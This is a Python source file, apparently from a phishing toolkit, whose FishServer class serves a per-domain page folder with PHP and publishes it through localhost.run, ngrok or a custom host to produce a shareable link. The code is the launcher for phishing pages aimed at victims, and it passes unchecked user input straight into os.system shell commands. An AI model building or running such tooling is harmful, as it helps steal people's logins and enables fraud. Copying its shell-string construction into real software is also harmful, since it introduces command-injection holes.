import os
import time
from colorama import Fore, Back
from subprocess import check_output, CalledProcessError


class FishServer():
	def __init__(self):
		...
	def start(self, domain):
		os.system("fuser -k -n tcp 8080 && killall php ssh")
		os.system('clear')
		print(Fore.RED + open('banner.ban', 'r').read() + '\n')

		print(Fore.YELLOW + " [" + Fore.CYAN + "1" + Fore.YELLOW + "] " + Fore.WHITE + "localhost.run \n")
		print(Fore.YELLOW + " [" + Fore.CYAN + "2" + Fore.YELLOW + "] " + Fore.WHITE + "ngrok.io \n")
		print(Fore.YELLOW + " [" + Fore.CYAN + "3" + Fore.YELLOW + "] " + Fore.WHITE + "Custom host \n")
		fish_server = int(input(Fore.BLUE + "Choose the variant: " + Fore.WHITE))
		print(Fore.GREEN)
		if fish_server == 1:
			
			os.system('cd ht/' + domain + ' && php -S localhost:8080 > tmp.txt 2>&1 &')
			os.system('ssh -R 80:localhost:8080 ssh.localhost.run > url &')
			time.sleep(6)
			
			link = open('url', 'r').read().split(' ')[0]
			


		elif fish_server == 2:
			if 'Android' in os.popen('uname -a').read() and 'ap0:' in os.popen('ifconfig').read():
				pass
			elif 'Android' in os.popen('uname -a').read() and not 'ap0:' in os.popen('ifconfig').read():
				print('Please, turn on Access Point on your phone!')
				input('Are you ready? [Y]: ')
				

			print('Starting...')
			
		
			os.system('cd ht/' + domain + ' && php -S localhost:8080 > tmp.txt 2>&1 &')
			os.system('./ngrok http 8080 > bin/ngrok.log &')
			time.sleep(8)
			link = os.popen('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z\-]*\.ngrok.io" -oh').read()
			



		elif fish_server == 3:
			host = input('Host: ')
			port = input('Port: ')
			link = str(host) + ':' + str(port)

			os.system('cd ht/' + domain + ' && php -S ' + link + ' > tmp.txt 2>&1 &')
		return link

